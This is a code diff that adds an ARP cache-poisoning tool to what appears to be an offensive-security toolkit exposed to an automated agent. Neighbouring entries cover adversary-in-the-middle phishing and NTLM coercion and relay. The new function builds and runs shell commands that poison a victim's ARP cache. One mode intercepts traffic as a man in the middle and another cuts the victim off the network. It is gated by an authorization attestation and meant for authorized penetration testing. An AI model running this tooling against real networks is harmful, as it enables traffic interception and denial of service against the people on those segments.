@@ -2957,6 +2957,51 @@ def tool_aitm(args: dict) -> str:
 
 
 
+
+def tool_arp(args: dict) -> str:
+    """ARP cache poisoning on an AUTHORIZED local segment (EONRaider/Arp-Spoofer, a
+    zero-dependency pure-Python spoofer; shelled out, not vendored — AGPL stays
+    separate). mode=mitm (bidirectional, sets ip_forward, keeps the victim online) |
+    disassociate (cut the victim off — DISRUPTIVE / DoS-class, in-scope single target
+    only). Runs bounded for `seconds` then restores ARP on exit. Needs target (victim IP
+    on your segment) + authorization; SCOPE-confined; rate-limited; root (raw sockets)."""
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    mode = str(args.get("mode", "mitm")).strip().lower()
+    dur = str(int(str(args.get("seconds", "30")) or 30))
+    opts = []
+    iface = str(args.get("interface", "")).strip()
+    if iface:
+        opts.append("-i " + shlex.quote(iface))
+    gate = str(args.get("gateway", "")).strip()
+    if gate:
+        opts.append("--gatewayip " + shlex.quote(gate))
+    interval = str(args.get("interval", "")).strip()
+    if interval:
+        opts.append("--interval " + shlex.quote(interval))
+    if mode == "mitm":
+        opts.append("-f")
+    elif mode in ("disassociate", "dos"):
+        opts.append("-d")
+    else:
+        return "arp mode = mitm (MITM, victim stays online) | disassociate (cut victim off — disruptive)."
+    # resolve the cloned spoofer; run bounded, SIGINT so its restore-on-exit re-ARPs.
+    loc = ('P=$(ls /opt/arp-spoofer/arpspoof.py 2>/dev/null | head -1 || command -v arpspoof.py); '
+           '[ -n "$P" ] || { echo ARPSPOOF_MISSING; exit 127; }; ')
+    cmd = (loc + "timeout --signal=INT " + dur + " python3 \"$P\" " + " ".join(opts)
+           + " " + shlex.quote(target) + " 2>&1 | tail -60; echo '[arp: run ended; tool restores the cache on exit]'")
+    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, int(dur) + 30))
+    if "ARPSPOOF_MISSING" in out:
+        return ("arp: EONRaider/Arp-Spoofer not present — `sygnif kali-setup` clones it to "
+                "/opt/arp-spoofer, or: git clone https://github.com/EONRaider/Arp-Spoofer /opt/arp-spoofer")
+    tag = "arp(" + mode + ")"
+    if mode in ("disassociate", "dos"):
+        out = "[DISRUPTIVE: this cut the target off the network for " + dur + "s — authorized single-target test only]\n" + out
+    return _off_report(tag, args.get("authorization", ""), "arpspoof " + " ".join(opts) + " " + target, out, rc, where, target)
+
+
 def tool_coerce(args: dict) -> str:
     """Authentication coercion + NTLM relay for an AUTHORIZED AD engagement (Coercer +
     Impacket ntlmrelayx): the no-creds coerce->relay->ADCS/DCSync chain. mode=coerce
@@ -3588,6 +3633,17 @@ BUILTIN_TOOLS: dict[str, dict] = {
                  "domain": "phishing domain you control/are authorized to use",
                  "phishlet": "phishlet name (see mode=phishlets)"},
         "func": tool_aitm,
+    },
+    "arp": {
+        "desc": ("ARP cache poisoning on an authorized local segment (EONRaider/Arp-Spoofer, "
+                 "zero-dep pure-Python, shelled out). mode=mitm (MITM, victim stays online) | "
+                 "disassociate (cut victim off — DISRUPTIVE). Bounded by seconds=, restores on "
+                 "exit. Needs target(victim IP) + authorization; SCOPE-confined; rate-limited; root."),
+        "args": {"target": "victim IP on your segment", "authorization": "attestation",
+                 "mode": "mitm|disassociate", "seconds": "run duration (default 30)",
+                 "interface": "NIC (auto if omitted)", "gateway": "gateway IP (auto if omitted)",
+                 "interval": "ARP send interval"},
+        "func": tool_arp,
     },
     "coerce": {
         "desc": ("Auth coercion + NTLM relay for an authorized AD engagement (Coercer + "
